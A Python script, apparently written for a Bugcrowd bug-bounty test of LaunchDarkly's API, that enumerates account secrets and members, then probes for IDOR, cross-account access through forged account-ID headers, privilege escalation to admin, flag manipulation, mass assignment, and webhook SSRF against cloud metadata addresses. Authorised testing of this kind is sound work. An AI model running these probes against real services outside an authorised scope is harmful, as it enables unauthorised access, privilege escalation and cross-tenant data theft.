#!/usr/bin/env python3
"""
LaunchDarkly Authenticated Deep Scan
=====================================
Run AFTER creating a test account on app.launchdarkly.com

HOW TO GET YOUR CREDENTIALS:
1. Go to https://app.launchdarkly.com and sign up with your @bugcrowdninja email
2. Log in, then:
   
   Option A — API Token (PREFERRED):
     Go to Account Settings → Authorization → API Access Tokens
     Create a token with "Reader" role
     Paste it below as API_TOKEN
   
   Option B — Session Cookie:
     Open DevTools (F12) → Application → Cookies
     Copy the value of the session cookie (usually "ajs_anonymous_id" or similar)
     Also grab the Authorization header from any XHR request in Network tab

3. Run: python authenticated_scan.py
"""

import requests
import json
import time
import re
import sys
import os
import copy
from pathlib import Path
from urllib.parse import urlparse, urlencode

os.environ["PYTHONIOENCODING"] = "utf-8"
try:
    sys.stdout.reconfigure(encoding="utf-8")
except:
    pass

# ============================================================
# CONFIGURE THESE AFTER CREATING YOUR ACCOUNT
# ============================================================
API_TOKEN = os.environ.get("LD_API_TOKEN", "")  # Your LaunchDarkly API token
SESSION_COOKIE = os.environ.get("LD_SESSION", "")  # Or paste session cookie

# If you have a SECOND account for IDOR testing (optional but ideal)
API_TOKEN_2 = os.environ.get("LD_API_TOKEN_2", "")

BASE = "https://app.launchdarkly.com"
RESULTS = []

# ============================================================

def sep(title):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")

def log_finding(severity, vuln_type, url, detail, confidence="HIGH", verified=False):
    finding = {
        "severity": severity,
        "type": vuln_type,
        "url": url,
        "detail": detail,
        "confidence": confidence,
        "verified": verified,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    RESULTS.append(finding)
    emoji = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}.get(severity, "⚪")
    v = "✅ VERIFIED" if verified else ""
    print(f"\n  {emoji} [{severity}] {vuln_type} {v}")
    print(f"     URL: {url}")
    print(f"     Detail: {detail}")
    return finding

def get_auth_headers(token=None):
    """Build auth headers."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    if token:
        headers["Authorization"] = token
    elif API_TOKEN:
        headers["Authorization"] = API_TOKEN
    return headers

def api_get(path, token=None, params=None):
    """Make authenticated GET to API."""
    url = f"{BASE}{path}"
    try:
        r = requests.get(url, headers=get_auth_headers(token), params=params, timeout=10)
        return r
    except Exception as e:
        print(f"  ERROR: {e}")
        return None

def api_post(path, data=None, token=None):
    url = f"{BASE}{path}"
    try:
        r = requests.post(url, headers=get_auth_headers(token), json=data, timeout=10)
        return r
    except Exception as e:
        print(f"  ERROR: {e}")
        return None

def api_patch(path, data=None, token=None):
    url = f"{BASE}{path}"
    headers = get_auth_headers(token)
    headers["Content-Type"] = "application/json; domain-model=launchdarkly.semanticpatch"
    try:
        r = requests.patch(url, headers=headers, json=data, timeout=10)
        return r
    except Exception as e:
        print(f"  ERROR: {e}")
        return None

def api_delete(path, token=None):
    url = f"{BASE}{path}"
    try:
        r = requests.delete(url, headers=get_auth_headers(token), timeout=10)
        return r
    except Exception as e:
        print(f"  ERROR: {e}")
        return None


def main():
    if not API_TOKEN and not SESSION_COOKIE:
        print("=" * 70)
        print("  NO CREDENTIALS CONFIGURED!")
        print("=" * 70)
        print("""
  Set your LaunchDarkly API token:

  Windows (PowerShell):
    $env:LD_API_TOKEN = "api-xxxx-your-token-here"
    python authenticated_scan.py

  Or edit this file and paste your token on line 43.

  HOW TO GET A TOKEN:
  1. Sign up at https://app.launchdarkly.com with @bugcrowdninja email
  2. Go to Account Settings > Authorization > API Access Tokens
  3. Create a new token with "Reader" role
  4. Copy the token value
        """)
        return

    sep("LAUNCHDARKLY AUTHENTICATED DEEP SCAN")

    # ── Phase 0: Verify auth & get identity ──
    sep("PHASE 0: VERIFY AUTH & IDENTITY")
    
    r = api_get("/api/v2/caller-identity")
    if not r or r.status_code != 200:
        print(f"  AUTH FAILED: {r.status_code if r else 'no response'}")
        if r:
            print(f"  {r.text[:300]}")
        print("  Check your token and try again.")
        return
    
    identity = r.json()
    print(f"  Authenticated as:")
    account_id = identity.get("accountId", "unknown")
    member_id = identity.get("memberId", identity.get("_id", "unknown"))
    print(f"    Account ID: {account_id}")
    print(f"    Member ID:  {member_id}")
    print(f"    Name:       {identity.get('name', 'N/A')}")
    print(f"    Email:      {identity.get('email', 'N/A')}")
    print(f"    Role:       {identity.get('role', 'N/A')}")
    print(f"    Bounty:     {identity.get('bountyEligible', 'N/A')}")
    
    # Check if bounty eligible
    if not identity.get("bountyEligible"):
        print("\n  ⚠️  bountyEligible is NOT true — findings may not be rewarded!")
        print("     Contact LaunchDarkly support or check Bugcrowd program rules.")

    # ── Phase 1: Enumerate account data ──
    sep("PHASE 1: ACCOUNT DATA ENUMERATION")
    
    # Get account info
    r = api_get("/api/v2/account")
    if r and r.status_code == 200:
        acct = r.json()
        print(f"  Account: {acct.get('name', 'N/A')}")
        print(f"  Plan:    {acct.get('plan', {}).get('name', 'N/A')}")
        org_id = acct.get("_id", "unknown")
        print(f"  Org ID:  {org_id}")

    # Get all projects
    r = api_get("/api/v2/projects")
    projects = []
    if r and r.status_code == 200:
        data = r.json()
        items = data.get("items", [])
        print(f"\n  Projects ({len(items)}):")
        for p in items:
            pkey = p.get("key", "")
            pname = p.get("name", "")
            projects.append(pkey)
            print(f"    - {pkey}: {pname}")
            # Get environments for each project
            envs = p.get("environments", {})
            if isinstance(envs, dict):
                for ek, ev in envs.items():
                    sdk_key = ev.get("_sdkKey", "N/A")
                    mobile_key = ev.get("_mobileKey", "N/A")
                    api_key = ev.get("apiKey", "N/A")
                    if sdk_key != "N/A":
                        print(f"      Env '{ek}': SDK={sdk_key[:20]}... Mobile={mobile_key[:20]}...")
                        log_finding("MEDIUM", "SDK_KEY_EXPOSED", f"/api/v2/projects", 
                                   f"SDK key for env '{ek}' in project '{pkey}' exposed via API", "HIGH")

    # Get members
    r = api_get("/api/v2/members")
    members = []
    if r and r.status_code == 200:
        data = r.json()
        items = data.get("items", [])
        print(f"\n  Members ({len(items)}):")
        for m in items:
            mid = m.get("_id", "")
            email = m.get("email", "N/A")
            role = m.get("role", "N/A")
            members.append({"id": mid, "email": email, "role": role})
            print(f"    - {email} ({role}) [ID: {mid}]")

    # Get tokens
    r = api_get("/api/v2/tokens")
    if r and r.status_code == 200:
        data = r.json()
        items = data.get("items", [])
        print(f"\n  API Tokens ({len(items)}):")
        for t in items:
            print(f"    - {t.get('name','N/A')} | Role: {t.get('role','N/A')} | Last used: {t.get('lastUsed','N/A')}")

    # ── Phase 2: IDOR Testing ──
    sep("PHASE 2: IDOR TESTING")
    
    print("\n[2a] Testing IDOR on member endpoints...")
    # Try accessing other member IDs by incrementing/modifying
    if members:
        my_id = member_id
        for m in members:
            if m["id"] != my_id:
                # Try to read another member's details
                r = api_get(f"/api/v2/members/{m['id']}")
                if r and r.status_code == 200:
                    other = r.json()
                    other_email = other.get("email", "N/A")
                    print(f"  Can read member {m['id']}: {other_email}")
                    # This might be expected if we're admin, but check if it leaks sensitive data
                    if "mfa" in json.dumps(other).lower() or "password" in json.dumps(other).lower():
                        log_finding("HIGH", "IDOR_MEMBER_DATA", f"/api/v2/members/{m['id']}",
                                   f"Can access sensitive member data for {other_email}", verified=True)
    
    # Try common IDOR patterns
    print("\n[2b] Testing IDOR with manipulated IDs...")
    idor_tests = [
        # Try numeric IDs
        "/api/v2/members/1",
        "/api/v2/members/0",
        "/api/v2/members/admin",
        # Try UUID patterns
        "/api/v2/members/00000000-0000-0000-0000-000000000000",
        # Try accessing other accounts
        "/api/v2/account/members",
    ]
    for path in idor_tests:
        r = api_get(path)
        if r and r.status_code == 200:
            print(f"  ACCESSIBLE: {path} -> {r.text[:150]}")
            log_finding("HIGH", "IDOR", path, f"Accessible with status 200", verified=True)
        elif r:
            print(f"  {path} -> {r.status_code}")

    # ── Phase 3: Internal API with Account ID ──
    sep("PHASE 3: INTERNAL API WITH ACCOUNT ID HEADER")
    
    print(f"\n  Trying /internal/account with X-Account-Id: {account_id}")
    for header_name in ["X-Account-Id", "X-Account-ID", "Account-Id", "X-Org-Id", "X-Organization-Id"]:
        headers = get_auth_headers()
        headers[header_name] = account_id
        try:
            r = requests.get(f"{BASE}/internal/account", headers=headers, timeout=10)
            if r.status_code == 200:
                ct = r.headers.get("Content-Type", "")
                if "json" in ct:
                    print(f"  {header_name}: {account_id} -> 200 JSON!")
                    print(f"  Body: {r.text[:500]}")
                    log_finding("HIGH", "INTERNAL_API_ACCESS", "/internal/account",
                               f"Accessible via {header_name} header", verified=True)
                else:
                    print(f"  {header_name}: 200 but HTML (SPA shell)")
            elif r.status_code == 401:
                resp = r.json() if "json" in r.headers.get("Content-Type", "") else {}
                msg = resp.get("message", r.text[:100])
                print(f"  {header_name}: 401 - {msg}")
            else:
                print(f"  {header_name}: {r.status_code}")
        except Exception as e:
            print(f"  {header_name}: ERROR - {e}")

    # ── Phase 4: Privilege Escalation ──
    sep("PHASE 4: PRIVILEGE ESCALATION TESTS")
    
    # Try to create an admin token with a reader token
    print("\n[4a] Can reader token create admin token?")
    r = api_post("/api/v2/tokens", data={
        "name": "test-escalation",
        "role": "admin",
        "description": "Security test - privilege escalation check"
    })
    if r:
        if r.status_code in [200, 201]:
            log_finding("CRITICAL", "PRIVILEGE_ESCALATION", "/api/v2/tokens",
                       "Reader token can create admin-level API tokens!", verified=True)
            # Clean up - delete the token
            token_id = r.json().get("_id", "")
            if token_id:
                api_delete(f"/api/v2/tokens/{token_id}")
        else:
            print(f"  Blocked: {r.status_code} (expected)")

    # Try to change own role
    print("\n[4b] Can user change their own role to admin?")
    r = api_patch(f"/api/v2/members/{member_id}", data={
        "instructions": [{"kind": "replaceMemberRole", "value": "admin"}]
    })
    if r:
        if r.status_code == 200:
            new_role = r.json().get("role", "")
            if new_role == "admin":
                log_finding("CRITICAL", "SELF_ROLE_ESCALATION", f"/api/v2/members/{member_id}",
                           "User can escalate own role to admin!", verified=True)
        else:
            print(f"  Blocked: {r.status_code} (expected)")

    # Try to invite a new admin member
    print("\n[4c] Can reader invite admin members?")
    r = api_post("/api/v2/members", data={
        "email": "idor-test-should-not-exist@example.com",
        "role": "admin"
    })
    if r:
        if r.status_code in [200, 201]:
            log_finding("CRITICAL", "INVITE_ADMIN", "/api/v2/members",
                       "Reader can invite new admin members!", verified=True)
        else:
            print(f"  Blocked: {r.status_code} (expected)")

    # ── Phase 5: Flag Manipulation ──
    sep("PHASE 5: FLAG MANIPULATION (WRITE ACCESS CHECK)")
    
    if projects:
        proj = projects[0]
        # Get flags
        r = api_get(f"/api/v2/flags/{proj}")
        if r and r.status_code == 200:
            flags = r.json().get("items", [])
            print(f"  Project '{proj}' has {len(flags)} flags")
            
            if flags:
                flag_key = flags[0].get("key", "")
                print(f"\n[5a] Can reader toggle flag '{flag_key}'?")
                
                # Try to toggle a flag (should fail for reader)
                r = api_patch(f"/api/v2/flags/{proj}/{flag_key}", data={
                    "instructions": [{"kind": "turnFlagOn"}]
                })
                if r:
                    if r.status_code == 200:
                        log_finding("CRITICAL", "FLAG_MANIPULATION", 
                                   f"/api/v2/flags/{proj}/{flag_key}",
                                   "Reader token can toggle feature flags!", verified=True)
                        # Revert
                        api_patch(f"/api/v2/flags/{proj}/{flag_key}", data={
                            "instructions": [{"kind": "turnFlagOff"}]
                        })
                    else:
                        print(f"  Blocked: {r.status_code} (expected)")
            
            # Try to create a flag
            print(f"\n[5b] Can reader create flags?")
            r = api_post(f"/api/v2/flags/{proj}", data={
                "key": "security-test-flag-delete-me",
                "name": "Security Test Flag (delete me)"
            })
            if r:
                if r.status_code in [200, 201]:
                    log_finding("HIGH", "FLAG_CREATION", f"/api/v2/flags/{proj}",
                               "Reader token can create feature flags!", verified=True)
                    api_delete(f"/api/v2/flags/{proj}/security-test-flag-delete-me")
                else:
                    print(f"  Blocked: {r.status_code} (expected)")

    # ── Phase 6: Webhook SSRF ──
    sep("PHASE 6: WEBHOOK SSRF TEST")
    
    print("\n  Testing if webhooks can target internal IPs...")
    ssrf_targets = [
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://127.0.0.1:80/",
        "http://localhost:8080/",
        "http://[::1]/",
        "http://0.0.0.0/",
    ]
    for target in ssrf_targets:
        r = api_post("/api/v2/webhooks", data={
            "url": target,
            "name": "security-test-ssrf",
            "sign": False,
            "on": False,
            "statements": [{"effect": "allow", "actions": ["*"], "resources": ["proj/*"]}]
        })
        if r:
            if r.status_code in [200, 201]:
                webhook_id = r.json().get("_id", "")
                print(f"  CREATED webhook to {target}!")
                log_finding("HIGH", "SSRF_VIA_WEBHOOK", "/api/v2/webhooks",
                           f"Webhook created targeting internal IP: {target}", verified=True)
                if webhook_id:
                    api_delete(f"/api/v2/webhooks/{webhook_id}")
            elif r.status_code == 400:
                err = r.json().get("message", "")
                print(f"  Blocked: {target} -> {err[:80]}")
            else:
                print(f"  {target} -> {r.status_code}")

    # ── Phase 7: Cross-account access via /internal/ ──
    sep("PHASE 7: CROSS-ACCOUNT ACCESS VIA INTERNAL API")
    
    # Try different account IDs to see if we can access other orgs
    test_account_ids = [
        "000000000000000000000000",
        "111111111111111111111111", 
        "aaaaaaaaaaaaaaaaaaaaaaaa",
        account_id[:-1] + ("0" if account_id[-1] != "0" else "1"),  # Off by one
    ]
    
    for test_id in test_account_ids:
        headers = get_auth_headers()
        headers["X-Account-Id"] = test_id
        try:
            r = requests.get(f"{BASE}/internal/account", headers=headers, timeout=5)
            if r.status_code == 200 and "json" in r.headers.get("Content-Type", ""):
                data = r.json()
                if data and not data.get("code"):
                    print(f"  CROSS-ACCOUNT ACCESS with ID {test_id}!")
                    log_finding("CRITICAL", "CROSS_ACCOUNT_IDOR", "/internal/account",
                               f"Accessed another account data with ID: {test_id}", verified=True)
                else:
                    print(f"  {test_id}: {r.status_code} - {str(data)[:100]}")
            else:
                print(f"  {test_id}: {r.status_code}")
        except:
            pass

    # ── Phase 8: Mass Assignment ──
    sep("PHASE 8: MASS ASSIGNMENT TESTS")
    
    # Try to add admin properties during profile update
    print("\n  Testing mass assignment on member profile...")
    mass_assign_payloads = [
        {"role": "admin"},
        {"role": "owner"},
        {"isAdmin": True},
        {"admin": True},
        {"permissions": ["*"]},
        {"customRoles": ["admin"]},
    ]
    for payload in mass_assign_payloads:
        r = api_patch(f"/api/v2/members/{member_id}", data={
            "instructions": [{"kind": "replaceMemberRole", "value": list(payload.values())[0]}]
        })
        if r and r.status_code == 200:
            new_data = r.json()
            new_role = new_data.get("role", "")
            if new_role in ["admin", "owner"]:
                log_finding("CRITICAL", "MASS_ASSIGNMENT", f"/api/v2/members/{member_id}",
                           f"Mass assignment escalated role via: {payload}", verified=True)
        elif r:
            print(f"  {payload} -> {r.status_code}")

    # ── Phase 9: Audit Log Access ──
    sep("PHASE 9: AUDIT LOG & SENSITIVE DATA ACCESS")
    
    sensitive_endpoints = [
        ("/api/v2/auditlog", "Audit logs"),
        ("/api/v2/usage", "Usage/billing data"),
        ("/api/v2/account/relay-auto-configs", "Relay proxy configs"),
        ("/api/v2/integration-capabilities", "Integration capabilities"),
        (f"/api/v2/account", "Full account details"),
    ]
    for path, desc in sensitive_endpoints:
        r = api_get(path)
        if r:
            if r.status_code == 200:
                body = r.text[:300]
                print(f"  ACCESSIBLE: {desc} ({path})")
                print(f"    Preview: {body}")
                # Check if it contains sensitive data
                if any(k in body.lower() for k in ["secret", "token", "key", "password", "billing"]):
                    log_finding("MEDIUM", "SENSITIVE_DATA_ACCESS", path,
                               f"Reader can access {desc} containing sensitive data")
            else:
                print(f"  {desc}: {r.status_code}")

    # ── Phase 10: DUAL-SESSION IDOR (if second token provided) ──
    if API_TOKEN_2:
        sep("PHASE 10: DUAL-SESSION IDOR")
        
        # Get identity of second account
        r2 = api_get("/api/v2/caller-identity", token=API_TOKEN_2)
        if r2 and r2.status_code == 200:
            id2 = r2.json()
            account_id_2 = id2.get("accountId", "")
            member_id_2 = id2.get("memberId", id2.get("_id", ""))
            print(f"  Account 2: {id2.get('email', 'N/A')} (ID: {account_id_2})")
            
            # Try to access Account 1's data with Account 2's token
            for path in [f"/api/v2/members/{member_id}", f"/api/v2/account"]:
                r = api_get(path, token=API_TOKEN_2)
                if r and r.status_code == 200:
                    print(f"  CROSS-ACCOUNT: Token 2 can access {path}!")
                    log_finding("CRITICAL", "CROSS_ACCOUNT_IDOR", path,
                               f"Account 2 token can access Account 1 data", verified=True)
    else:
        print("\n  [SKIP] Set LD_API_TOKEN_2 for dual-session IDOR testing")

    # ── Save results ──
    sep("RESULTS SUMMARY")
    
    results_file = Path("data/autopilot/launchdarkly_authenticated_scan.json")
    results_file.parent.mkdir(parents=True, exist_ok=True)
    results_file.write_text(json.dumps(RESULTS, indent=2, default=str), encoding="utf-8")
    
    print(f"\n  Total findings: {len(RESULTS)}")
    print(f"  Results saved: {results_file}")
    
    by_severity = {}
    for f in RESULTS:
        sev = f["severity"]
        by_severity[sev] = by_severity.get(sev, 0) + 1
    
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        if sev in by_severity:
            emoji = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}.get(sev, "⚪")
            print(f"    {emoji} {sev}: {by_severity[sev]}")
    
    if not RESULTS:
        print("  No vulnerabilities found. Target appears well-secured.")
    
    print(f"\n  Next: Review findings and submit to Bugcrowd")
    print(f"  https://bugcrowd.com/engagements/launchdarkly-mbb-og")


if __name__ == "__main__":
    main()
